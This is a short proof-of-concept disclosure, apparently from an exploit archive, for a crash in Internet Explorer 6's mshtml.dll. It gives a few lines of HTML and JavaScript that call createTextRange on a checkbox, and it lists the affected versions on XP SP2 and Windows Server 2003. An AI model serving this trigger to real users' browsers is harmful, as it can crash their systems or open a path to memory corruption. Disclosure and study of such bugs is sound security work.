MS Internet Explorer 6.0 (mshtml.dll checkbox) Crash
====================================================



<!--
Stelian Ene:

I can&#039;t find any info on this delicious IE bug, but it seems to be publicly known:

It will badly access a (virtual?) pointer table, making EIP to jump at a random
address. This has various effects on the system I&#039;ve tested with, including
crashing. It works on these versions of mshtml.dll:
XP SP2: 6.0.2900.2802 - latest
WS2003: 6.0.3790.0

<input type="checkbox" id=&#039;c&#039;>
<script>
        r=document.getElementById("c");
        a=r.createTextRange();
</script>
